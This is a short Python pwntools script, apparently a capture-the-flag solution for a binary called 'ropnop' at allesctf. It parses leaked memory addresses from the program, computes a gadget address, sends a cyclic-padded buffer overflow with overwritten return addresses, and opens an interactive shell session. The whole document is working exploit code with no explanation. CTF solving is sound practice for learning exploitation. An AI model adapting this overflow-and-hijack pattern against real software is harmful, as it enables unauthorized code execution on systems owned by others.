from pwn import *
import re

p=process("./ropnop")
#p=remote("hax1.allesctf.net",9102)
l=p.recvline().split(b" ")
start=int(l[3],16)
end=int(l[6].strip(),16)
print(l)
print("start",hex(start))
print("end",hex(end))
ropnop_addr=start+0x1200 #0x11e6
pad=b"x"*cyclic_find(b'gaaa')
input()
p.sendline(pad+p64(ropnop_addr+155)+p64(ropnop_addr))
#p.sendline(cyclic(0x14))
p.interactive()